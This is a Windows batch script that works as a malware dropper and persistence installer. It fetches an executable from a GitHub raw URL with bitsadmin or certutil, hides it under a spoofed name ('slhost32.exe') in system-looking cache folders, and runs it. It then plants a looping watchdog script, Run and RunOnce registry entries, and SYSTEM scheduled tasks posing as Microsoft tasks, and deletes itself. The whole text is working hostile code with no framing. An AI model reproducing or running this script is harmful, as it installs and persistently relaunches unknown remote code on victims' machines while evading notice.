@echo off
setlocal enabledelayedexpansion

set "G=https://github.com/nazar2132/huita727262/raw/refs/heads/main/hi.exe"
set "P=slhost32.exe"

set "A=%WINDIR%\SyswXM64\WindowsPowerShell\v1.0\Modules\Cache"
set "B=%WINDIR%\System32\WindowsPowerShell\v1.0\Modules\Cache"
set "C=%WINDIR%\Temp\Microsoft.NET\Framework\v4.0.30319\NativeCache"
set "D=%WINDIR%\System32\drivers\etc\Cache"
set "E=%APPDATA%\Microsoft\Windows\Themes\Cached"
set "F=%WINDIR%\System32\Tasks\Microsoft\Windows\System"
set "H=%WINDIR%\SysWOW64\config\systemprofile\AppData\Local\Microsoft\Windows\Cache"
set "I=%WINDIR%\System32\config\systemprofile\AppData\Local\Microsoft\Windows\Cache"
set "J=%WINDIR%\Microsoft.NET\assembly\GAC_MSIL\Cache"

timeout /t 1 /nobreak >nul
mkdir "!A!" "!B!" "!C!" "!D!" "!E!" "!F!" "!H!" "!I!" "!J!" >nul 2>&1
attrib +s +h "!A!" "!B!" "!C!" "!D!" "!E!" "!F!" "!H!" "!I!" "!J!" >nul 2>&1

set /a R=%random%
set /a IDX=!R! %% 9

if !IDX!==0 set "T=!A!"
if !IDX!==1 set "T=!B!"
if !IDX!==2 set "T=!C!"
if !IDX!==3 set "T=!D!"
if !IDX!==4 set "T=!E!"
if !IDX!==5 set "T=!F!"
if !IDX!==6 set "T=!H!"
if !IDX!==7 set "T=!I!"
if !IDX!==8 set "T=!J!"

timeout /t 2 /nobreak >nul
if not exist "!T!\!P!" (
    timeout /t 3 /nobreak >nul
    bitsadmin /transfer dl /download "!G!" "!T!\!P!" >nul 2>&1
    timeout /t 4 /nobreak >nul
    if errorlevel 1 (
        certutil -urlcache -split -f "!G!" "!T!\!P!" >nul 2>&1
    )
)

timeout /t 2 /nobreak >nul
if exist "!T!\!P!" (
    attrib +s +h +r "!T!\!P!" >nul 2>&1
    timeout /t 1 /nobreak >nul
    start "" "!T!\!P!"
    set LAUNCHED=1
)

if not defined LAUNCHED (
    timeout /t 2 /nobreak >nul
    for %%d in ("!A!" "!B!" "!C!" "!D!" "!E!" "!F!" "!H!" "!I!" "!J!") do (
        if exist "%%~d\!P!" (
            timeout /t 1 /nobreak >nul
            start "" "%%~d\!P!"
            set LAUNCHED=1
            timeout /t 2 /nobreak >nul
            goto :next
        )
    )
)

:next
if not defined LAUNCHED (
    timeout /t 3 /nobreak >nul
    bitsadmin /transfer fb /download "!G!" "!A!\!P!" >nul 2>&1
    timeout /t 5 /nobreak >nul
    if exist "!A!\!P!" (
        start "" "!A!\!P!"
    )
)

timeout /t 2 /nobreak >nul

(
echo @echo off
echo :start
echo timeout /t 30 /nobreak ^>nul
echo tasklist ^| find /i "slhost32.exe" ^>nul
echo if errorlevel 1 (
echo   set /a r=%%random%% %% 9
echo   if %%r%%==0 if exist "!A!\slhost32.exe" start "" "!A!\slhost32.exe"
echo   if %%r%%==1 if exist "!B!\slhost32.exe" start "" "!B!\slhost32.exe"
echo   if %%r%%==2 if exist "!C!\slhost32.exe" start "" "!C!\slhost32.exe"
echo   if %%r%%==3 if exist "!D!\slhost32.exe" start "" "!D!\slhost32.exe"
echo   if %%r%%==4 if exist "!E!\slhost32.exe" start "" "!E!\slhost32.exe"
echo   if %%r%%==5 if exist "!F!\slhost32.exe" start "" "!F!\slhost32.exe"
echo   if %%r%%==6 if exist "!H!\slhost32.exe" start "" "!H!\slhost32.exe"
echo   if %%r%%==7 if exist "!I!\slhost32.exe" start "" "!I!\slhost32.exe"
echo   if %%r%%==8 if exist "!J!\slhost32.exe" start "" "!J!\slhost32.exe"
echo   timeout /t 10 /nobreak ^>nul
echo   tasklist ^| find /i "slhost32.exe" ^>nul
echo   if errorlevel 1 (
echo     for %%d in ("!A!" "!B!" "!C!" "!D!" "!E!" "!F!" "!H!" "!I!" "!J!") do (
echo       if exist %%~d\slhost32.exe (
echo         start "" %%~d\slhost32.exe
echo         goto :cont
echo       )
echo     )
echo     bitsadmin /transfer r2 /download "!G!" "!A!\slhost32.exe" ^>nul 2^>^&1
echo     timeout /t 8 /nobreak ^>nul
echo     if exist "!A!\slhost32.exe" start "" "!A!\slhost32.exe"
echo   )
echo )
echo :cont
echo goto start
) > "%TEMP%\~wd.cmd" 2>nul

timeout /t 3 /nobreak >nul
start "" /min "%TEMP%\~wd.cmd"

timeout /t 2 /nobreak >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "cmd /c start /min \"\" \"%TEMP%\~wd.cmd\"" /f >nul 2>&1

timeout /t 4 /nobreak >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsMonitor" /t REG_SZ /d "cmd /c start /min \"\" \"%TEMP%\~wd.cmd\"" /f >nul 2>&1

timeout /t 3 /nobreak >nul
schtasks /create /tn "Microsoft\Windows\Monitor" /tr "cmd /c start /min \"\" \"%TEMP%\~wd.cmd\"" /sc onlogon /ru SYSTEM /f >nul 2>&1

timeout /t 2 /nobreak >nul
for %%d in ("!A!" "!B!" "!C!" "!D!" "!E!" "!F!" "!H!" "!I!" "!J!") do (
    (
    echo @echo off
    echo timeout /t 15 /nobreak ^>nul
    echo if exist "%%~d\!P!" start "" "%%~d\!P!"
    echo timeout /t 2 /nobreak ^>nul
    echo exit
    ) > "%%~d\l.bat" 2>nul
    attrib +s +h "%%~d\l.bat" >nul 2>&1
    timeout /t 1 /nobreak >nul
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "L%%~nxd" /t REG_SZ /d "cmd /c start /min \"\" \"%%~d\l.bat\"" /f >nul 2>&1
    
    timeout /t 1 /nobreak >nul
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SysL%%~nxd" /t REG_SZ /d "cmd /c start /min \"\" \"%%~d\l.bat\"" /f >nul 2>&1
    
    timeout /t 1 /nobreak >nul
    schtasks /create /tn "Microsoft\Windows\System_%%~nxd" /tr "cmd /c start /min \"\" \"%%~d\l.bat\"" /sc onstart /ru SYSTEM /f >nul 2>&1
)

timeout /t 5 /nobreak >nul
if exist "%~f0" del /f /q "%~f0" >nul 2>&1
exit